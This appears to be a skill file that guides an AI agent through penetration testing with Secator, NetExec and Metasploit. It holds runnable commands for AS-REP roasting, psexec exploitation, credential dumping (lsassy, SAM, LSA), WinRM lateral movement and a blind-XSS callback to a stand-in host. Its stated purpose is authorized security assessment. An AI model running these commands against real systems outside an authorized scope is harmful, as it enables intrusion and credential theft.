---
name: vapt
description: Comprehensive vulnerability assessment and penetration testing skill leveraging Secator, NetExec, Metasploit, and raw Python for advanced exploitation chaining across Linux, Windows, Unix, macOS systems, network devices (switches, routers, firewalls), protocols, webapps and APIs (REST, GraphQL, gRPC). Uses OSSTMM and OWASP standards. Supports blackbox, greybox, and whitebox pentests with false-positive resistance, verified exploit confirmation, detailed step-by-step remediation, and full documentation. Use when performing security assessments, penetration tests, vulnerability scans, exploit validation, network enumeration, or security auditing.
---

# VAPT — Vulnerability Assessment & Penetration Testing

Systematic, standards-based security assessment chaining Secator (recon/scanning), NetExec (network protocols/AD), Metasploit (exploitation), and raw Python (custom verification and chaining).

## Assessment Types

| Type | Knowledge | Approach |
|------|-----------|----------|
| **Blackbox** | Zero prior knowledge | Full external recon → scan → exploit chain |
| **Greybox** | Partial (e.g., user creds, architecture docs) | Targeted testing with known entry points |
| **Whitebox** | Full access (source, configs, creds) | Source review → deep config audit → focused exploit |

When starting, determine the assessment type and load the corresponding phase sequence.

## Phase Sequence (All Assessments)

Every assessment follows this ordered pipeline. Each phase produces verified, documented output.

```
1. RECON          → Passive + active information gathering
2. MAPPING        → Port/service/technology identification
3. VULN SCAN      → Automated vulnerability detection
4. MANUAL TEST    → Targeted manual testing (OWASP/OSSTMM)
5. EXPLOITATION   → Verified exploit execution (Metasploit + custom)
6. POST-EXPLOIT   → Lateral movement, persistence, data access
7. VERIFY         → False-positive elimination and confirmation
8. REMEDIATE      → Step-by-step fix recommendations
9. REPORT         → Full documented evidence package
```

## Quick Start

### Blackbox External Assessment
```bash
# Phase 1-2: Recon + Mapping (Secator)
secator s domain target.com -json -o output/
secator s network 10.0.0.0/24 -json -o output/

# Phase 3: Vulnerability scanning
secator x nuclei target.com -tags cve,exposure -json -o output/vulns.json
secator x nmap target.com -p- -sV --script vuln -json -o output/nmap-vulns.json

# Phase 4-5: Manual testing + exploitation (load references)
# See references/owasp-testing-guide.md and references/exploitation-chaining.md
```

### Windows/AD Internal Assessment
```bash
# Phase 2-3: Network enumeration (NetExec)
nxc smb 10.0.0.0/24 -u '' -p '' --shares
nxc ldap 10.0.0.1 -u '' -p '' --asreproast asreproast.txt
nxc smb 10.0.0.0/24 -u admin -p 'P@ssw0rd' --pass-pol

# Phase 5: Exploitation (Metasploit)
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 10.0.0.5; set SMBUser admin; set SMBPass P@ssw0rd; run"

# Phase 7: Verification (Python)
python3 scripts/vapt-verify.py --phase verify --target 10.0.0.5 --evidence-dir output/
```

### Full Assessment with Chaining
```bash
# End-to-end orchestrated assessment
python3 scripts/vapt-chain.py --target target.com --type blackbox --scope webapp+network --output output/
```

## Tool Selection Matrix

| Target Category | Primary Tool | Secondary | Verification |
|----------------|-------------|-----------|-------------|
| DNS/Subdomain recon | Secator (subfinder, dnsx) | dig, dnsrecon | Python verify |
| Port scanning | Secator (naabu, nmap) | nmap direct | nmap –version-only |
| Web fuzzing | Secator (ffuf, feroxbuster) | dirsearch | Manual curl confirm |
| Web vuln scanning | Secator (nuclei, dalfox) | Manual testing | Burp/ZAP replay |
| Windows/AD enum | NetExec (SMB, LDAP, WinRM) | impacket | Python LDAP verify |
| Network protocols | NetExec (SSH, FTP, RDP, MSSQL) | nmap NSE | Python socket verify |
| Exploitation | Metasploit | Custom Python | Screenshot + re-exploit |
| Post-exploitation | MetExec + Metasploit | Python | Documented PoC |
| API testing | Secator (httpx) + Python scripts | curl | Burp replay |
| False-positive check | Python (vapt-verify.py) | Manual | Re-scan + diff |

## Phase Details

### Phase 1: RECON

**Blackbox**: Full passive recon → active recon → target enumeration
**Greybox**: Supplement known information with discovery
**Whitebox**: Validate provided info, find gaps

For detailed recon procedures: [references/osstmm-methodology.md](references/osstmm-methodology.md)

```bash
# Passive recon
secator x subfinder target.com -raw | secator x httpx -rl 10 -ss
secator x dnsx target.com -a -aaaa -cname -mx -ns -txt -soa -ptr

# Active recon
secator x httpx target.com -td -asn -cdn -server -title -status-code
secator x katana target.com -jc -js-crawl -known-files all -d 5
```

### Phase 2: MAPPING

```bash
# Full port scan
secator x naabu target.com -p- -json -rate 1000

# Service version detection
secator x nmap target.com -p 80,443,445,3389,8080 -sV -sC -json

# Network device discovery
nxc smb 10.0.0.0/24 -u '' -p ''  # Windows hosts
nxc ssh 10.0.0.0/24 -u '' -p ''  # Linux/Unix hosts
```

### Phase 3: VULN SCAN

```bash
# Web vulnerability scanning
secator x nuclei target.com -tags cve,exposure,misconfig -severity critical,high,medium

# Network vulnerability scanning
secator x nmap target.com --script vuln -json

# XSS scanning
secator x dalfox target.com -b https://callback.example.com

# WordPress scanning
secator x wpscan target.com -e ap,at,cb,dbe -api-token TOKEN
```

### Phase 4: MANUAL TEST

Load the appropriate testing guide:
- Web/API: [references/owasp-testing-guide.md](references/owasp-testing-guide.md)
- Network/System: [references/osstmm-methodology.md](references/osstmm-methodology.md)

### Phase 5: EXPLOITATION

Chain findings into exploit paths: [references/exploitation-chaining.md](references/exploitation-chaining.md)
Metasploit reference: [references/metasploit-reference.md](references/metasploit-reference.md)

### Phase 6: POST-EXPLOITATION

```bash
# Credential harvesting
nxc smb target -u admin -p 'P@ss' -M lsassy
nxc smb target -u admin -p 'P@ss' --sam
nxc smb target -u admin -p 'P@ss' --lsa

# Lateral movement
nxc smb 10.0.0.0/24 -u admin -p 'P@ss' --shares
nxc winrm target -u admin -p 'P@ss' -x "whoami /all"
```

### Phase 7: VERIFY (False-Positive Resistance)

**Every finding MUST be verified before reporting.** Use multi-method confirmation:
[references/false-positive-resistance.md](references/false-positive-resistance.md)

```bash
python3 scripts/vapt-verify.py --phase verify --target target.com --evidence-dir output/
```

### Phase 8: REMEDIATE

**Every confirmed finding MUST include step-by-step remediation.** See remediation templates:
[references/remediation-guide.md](references/remediation-guide.md)

Remediation format per finding:
1. **Problem**: What the vulnerability is
2. **Impact**: What an attacker can achieve
3. **Step-by-step Fix**: Numbered actionable steps with exact commands/configs
4. **Verification**: How to confirm the fix is applied
5. **References**: CIS, NIST, OWASP, vendor advisories

### Phase 9: REPORT

```bash
python3 scripts/vapt-report.py --input output/ --format html --template executive
```

For report structure: [references/reporting-templates.md](references/reporting-templates.md)

## API Testing (REST, GraphQL, gRPC)

### REST API
```bash
# Discovery
secator x httpx api.target.com -td -server -status-code -path /swagger.json /api/v1/docs

# Authentication testing
python3 scripts/vapt-chain.py --phase manual --target api.target.com --type api --spec openapi

# Fuzzing
secator x ffuf https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt
```

### GraphQL
```bash
# Introspection
curl -s -X POST https://api.target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name,fields{name}}}}"}' 

# Testing with Python
python3 -c "
import requests, json
r = requests.post('https://api.target.com/graphql', json={'query': '{__schema{types{name}}}'})
print(json.dumps(r.json(), indent=2))
"
```

### gRPC
```bash
# Service enumeration with grpcurl
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe Package.Service
```

## Critical Rules

1. **Always verify**: Never report unverified findings. Use 2+ methods for confirmation.
2. **Always document**: Screenshot, save raw output, note timestamps, record commands.
3. **Always remediate**: Every finding gets step-by-step fix instructions with exact commands.
4. **Chain findings**: Vulnerabilities in isolation misrepresent risk. Show attack paths.
5. **Scope strictly**: Never test outside authorized scope.
6. **Evidence integrity**: Hash evidence files, maintain chain of custody.
7. **Rate limit**: Respect target capacity. Use `-rl` flags in Secator, `--rate` in nmap.

## Advanced References

| Reference | Content |
|-----------|---------|
| [osstmm-methodology.md](references/osstmm-methodology.md) | Full OSSTMM-based methodology per channel |
| [owasp-testing-guide.md](references/owasp-testing-guide.md) | OWASP WSTG procedures with step-by-step tests |
| [secator-reference.md](references/secator-reference.md) | Complete Secator CLI & Python library reference |
| [netexec-reference.md](references/netexec-reference.md) | Full NetExec protocol and module reference |
| [metasploit-reference.md](references/metasploit-reference.md) | Metasploit exploitation, post-exploitation reference |
| [exploitation-chaining.md](references/exploitation-chaining.md) | Advanced exploit chain construction |
| [false-positive-resistance.md](references/false-positive-resistance.md) | Multi-method verification procedures |
| [remediation-guide.md](references/remediation-guide.md) | Step-by-step fix recommendations per vuln class |
| [reporting-templates.md](references/reporting-templates.md) | Report templates and evidence packaging |

## Scripts

| Script | Purpose |
|--------|---------|
| `scripts/vapt-recon.py` | Automated reconnaissance orchestrator |
| `scripts/vapt-verify.py` | False-positive verification engine |
| `scripts/vapt-report.py` | Report generation (HTML/PDF/Markdown) |
| `scripts/vapt-chain.py` | Exploitation chain orchestrator |